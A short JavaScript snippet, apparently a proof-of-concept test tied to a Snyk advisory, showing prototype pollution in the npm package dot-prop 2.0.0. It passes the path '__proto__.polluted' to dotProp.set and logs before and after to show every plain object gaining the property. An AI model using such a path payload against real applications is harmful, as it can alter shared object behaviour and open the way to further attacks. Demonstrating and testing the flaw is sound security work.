// //https://snyk.io/test/npm/dot-prop/2.0.0
// test("prototype pollution in dot-prop", () => {
console.log({}.polluted);

  const dotProp = require("dot-prop");
  dotProp.set({}, "__proto__.polluted", "yes");

console.log({}.polluted);
// });
